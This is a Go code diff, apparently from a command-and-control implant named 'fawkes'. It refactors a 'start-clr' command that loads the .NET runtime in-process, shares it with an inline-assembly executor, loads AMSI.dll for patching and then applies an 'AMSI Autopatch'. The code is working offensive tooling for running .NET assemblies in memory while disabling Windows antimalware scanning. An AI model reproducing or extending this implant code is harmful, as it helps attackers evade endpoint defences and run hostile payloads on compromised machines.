@@ -7,17 +7,11 @@ import (
 	"encoding/json"
 	"fmt"
 	"runtime"
-	"sync"
 	"syscall"
 
 	"fawkes/pkg/structs"
 
 	"github.com/Ne0nd0g/go-clr"
-)
-
-var (
-	clrInitialized bool
-	clrMutex       sync.Mutex
 )
 
 // StartCLRCommand implements the start-clr command
@@ -41,8 +35,9 @@ type StartCLRParams struct {
 
 // Execute executes the start-clr command
 func (c *StartCLRCommand) Execute(task structs.Task) structs.CommandResult {
-	clrMutex.Lock()
-	defer clrMutex.Unlock()
+	// Use the shared assemblyMutex from inlineassembly.go for CLR state
+	assemblyMutex.Lock()
+	defer assemblyMutex.Unlock()
 
 	// Ensure we're on Windows
 	if runtime.GOOS != "windows" {
@@ -73,12 +68,18 @@ func (c *StartCLRCommand) Execute(task structs.Task) structs.CommandResult {
 
 	var output string
 
-	// Check if CLR is already initialized
-	if clrInitialized {
+	// Check if CLR is already initialized (shared state with inline-assembly)
+	if clrStarted {
 		output += "[*] CLR already initialized in this process\n"
 	} else {
-		// Load and initialize the CLR using go-clr
-		_, err := clr.LoadCLR("v4.0.30319")
+		// Redirect STDOUT/STDERR for assembly output capture
+		err := clr.RedirectStdoutStderr()
+		if err != nil {
+			output += fmt.Sprintf("[-] Warning: Could not redirect output: %v\n", err)
+		}
+
+		// Load and initialize the CLR, storing the runtime host for inline-assembly
+		host, err := clr.LoadCLR("v4")
 		if err != nil {
 			return structs.CommandResult{
 				Output:    fmt.Sprintf("Error initializing CLR: %v", err),
@@ -86,7 +87,10 @@ func (c *StartCLRCommand) Execute(task structs.Task) structs.CommandResult {
 				Completed: true,
 			}
 		}
-		output += "[+] CLR v4.0.30319 runtime initialized successfully\n"
+		// Store in shared state so inline-assembly can reuse this runtime host
+		runtimeHost = host
+		clrStarted = true
+		output += "[+] CLR v4 runtime initialized successfully\n"
 
 		// Explicitly load AMSI.dll (needed for patching regardless of method)
 		err = loadAMSI()
@@ -95,8 +99,6 @@ func (c *StartCLRCommand) Execute(task structs.Task) structs.CommandResult {
 		} else {
 			output += "[+] AMSI.dll loaded successfully\n"
 		}
-
-		clrInitialized = true
 	}
 
 	// Apply AMSI Autopatch
